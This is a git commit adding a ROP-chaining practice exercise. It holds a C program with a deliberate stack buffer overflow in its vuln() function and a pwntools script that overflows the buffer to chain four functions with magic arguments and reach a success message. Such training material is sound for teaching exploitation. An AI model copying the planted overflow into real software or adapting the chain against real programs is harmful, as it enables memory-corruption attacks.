4cf6fcd1d93a0d8e1d6c653cdc9642e41c5ca761
Kevin Orr <kevinorr54@gmail.com>
2018-02-20 15:59:05 -0500

    Added rop_chaining

---
+++ 2018-02-20/rop_chaining/naive_solution.py
@@ -0,0 +1,30 @@
+#!/usr/bin/env python2
+
+import sys
+from pwn import *
+
+rop_1 = 0x080484b6
+rop_2 = 0x080484d8
+rop_3 = 0x080484fa
+rop_4 = 0x0804851c
+check = 0x0804853e
+
+rop_1_arg = 0xdeadbeef
+rop_2_arg = 0xcafebabe
+rop_3_arg = 0xbaddad
+rop_4_arg = 0x0ddba11
+
+payload  = 'a'*92
+payload += p32(rop_1)
+payload += p32(rop_2) + p32(rop_1_arg)
+payload += p32(rop_3) + p32(rop_2_arg)
+payload += p32(rop_4) + p32(rop_3_arg)
+payload += p32(check) + p32(rop_4_arg)
+
+# sys.stdout.write(payload)
+# sys.stdout.flush()
+
+p = process('./rop_chaining')
+p.send(payload)
+p.shutdown('out')
+p.stream()
---
+++ 2018-02-20/rop_chaining/rop_chaining.c
@@ -0,0 +1,51 @@
+#include <stdio.h>
+#include <string.h>
+#include <stdint.h>
+#include <stdlib.h>
+
+uint8_t flags = 0;
+
+void rop_1(uint32_t a) {
+    if (a == 0xdeadbeef)
+        flags |= 0b0001;
+    else
+        exit(1);
+}
+
+void rop_2(uint32_t a) {
+    if (a == 0xcafebabe)
+        flags |= 0b0010;
+    else
+        exit(1);
+}
+
+void rop_3(uint32_t a) {
+    if (a == 0xbaddad)
+        flags |= 0b0100;
+    else
+        exit(1);
+}
+
+void rop_4(uint32_t a) {
+    if (a == 0x0ddba11)
+        flags |= 0b1000;
+    else
+        exit(1);
+}
+
+void check() {
+    char * a = strdup("You got it!");
+    if (flags == 0b1111)
+        puts(a);
+    else
+        exit(1);
+}
+
+void vuln() {
+    uint32_t buf[20];
+    fgets(buf, 20*sizeof(uint64_t), stdin);
+}
+
+int main() {
+    vuln();
+}
